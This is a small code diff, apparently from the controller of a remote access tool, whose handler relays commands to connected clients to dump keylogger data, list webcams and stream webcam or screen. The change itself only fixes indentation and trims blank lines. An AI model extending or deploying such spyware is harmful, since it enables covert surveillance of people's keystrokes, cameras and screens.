@@ -152,7 +152,7 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + dump_keylogger_data())
             continue
 
-       elif command.startswith("webcam_stream") or command.startswith("screenshare"):
+        elif command.startswith("webcam_stream") or command.startswith("screenshare"):
             start_streaming(client_socket, mode)
             continue
         
@@ -161,8 +161,6 @@ def handle_client(client_socket, addr):
             client_socket.send(command.encode('utf-8'))
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
-
-
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
